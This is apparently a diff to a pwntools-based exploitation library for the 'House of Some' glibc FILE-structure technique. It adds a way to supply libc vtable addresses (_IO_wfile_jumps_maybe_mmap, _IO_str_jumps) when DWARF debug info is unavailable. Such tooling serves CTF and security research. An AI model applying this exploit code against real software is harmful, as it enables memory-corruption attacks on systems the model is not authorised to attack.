@@ -297,7 +297,7 @@ class ELF_with_DWARF(ELF):
     """
     def __init__(self, *args, debuginfo_filepath: str = None, **kwargs):
         super().__init__(*args, **kwargs)
-
+        self.is_with_dwarf = False
         if debuginfo_filepath is None:
             debuginfo_file = get_debug_filename(self)
         else:
@@ -308,6 +308,7 @@ class ELF_with_DWARF(ELF):
         log.info(f"Using debuginfo file: {debuginfo_file}")
         self.dwarf_elf: DWARF_ELF = DWARF_ELF(debuginfo_file, checksec=False)
         self._add_symbols()
+        self.is_with_dwarf = True
     
     def _add_symbols(self):
         two_have = self.symbols.keys() & self.dwarf_elf.symbols.keys()
@@ -343,7 +344,13 @@ class ELF_with_DWARF(ELF):
 
 
 class HouseOfSome2:
-    def __init__(self, libc: ELF, fake_stdout_addr: int = 0, controled_addr: int = 0, zero_addr: int = 0):
+    def __init__(self, 
+                 libc: ELF, 
+                 fake_stdout_addr: int = 0, 
+                 controled_addr: int = 0, 
+                 zero_addr: int = 0, 
+                 _IO_wfile_jumps_maybe_mmap: int = 0, 
+                 _IO_str_jumps: int = 0):
         self.libc = ELF_with_DWARF.from_ELF(libc)
         self.hos = HouseOfSome(self.libc, controled_addr, zero_addr)
         if fake_stdout_addr == 0:
@@ -351,13 +358,26 @@ class HouseOfSome2:
             log.success(f"Using Default _IO_2_1_stdout_ as fake_stdout_addr: {fake_stdout_addr:#x}")
         self.fake_stdout_addr = fake_stdout_addr
 
-        self._IO_wfile_jumps_maybe_mmap = self.libc.symbols['_IO_wfile_jumps_maybe_mmap']
-        log.success(f"_IO_wfile_jumps_maybe_mmap: {self._IO_wfile_jumps_maybe_mmap:#}")
-        self._IO_str_jumps = self.libc.symbols['_IO_str_jumps']
-        log.success(f"_IO_str_jumps: {self._IO_str_jumps:#}")
-        self._IO_default_xsputn = self._IO_str_jumps + 0x38
-        self._IO_default_xsgetn = self._IO_str_jumps + 0x40
+        if self.libc.is_with_dwarf:
+            self._IO_wfile_jumps_maybe_mmap = self.libc.symbols['_IO_wfile_jumps_maybe_mmap']
+            self._IO_str_jumps = self.libc.symbols['_IO_str_jumps']
+            self._IO_default_xsputn = self._IO_str_jumps + 0x38
+            self._IO_default_xsgetn = self._IO_str_jumps + 0x40
+        elif _IO_wfile_jumps_maybe_mmap != 0 and _IO_str_jumps != 0:
+            self._IO_wfile_jumps_maybe_mmap = _IO_wfile_jumps_maybe_mmap
+            self._IO_str_jumps = _IO_str_jumps
+            self._IO_default_xsputn = self._IO_str_jumps + 0x38
+            self._IO_default_xsgetn = self._IO_str_jumps + 0x40
+        else:
+            log.error(
+                "Could not find addresses of _IO_wfile_jumps_maybe_mmap, _IO_default_xsputn and _IO_default_xsgetn. "
+                "Use debuginfod.sh to download debug info or set args of _IO_wfile_jumps_maybe_mmap and _IO_str_jumps."
+            )
 
+        log.success(f"_IO_wfile_jumps_maybe_mmap: {self._IO_wfile_jumps_maybe_mmap:#}")
+        log.info(f"_IO_str_jumps: {self._IO_str_jumps:#}")
+        log.success(f"_IO_default_xsputn: {self._IO_default_xsputn:#}")
+        log.success(f"_IO_default_xsgetn: {self._IO_default_xsgetn:#}")
     
     def get_first_fake_stdout(self):
         return flat({
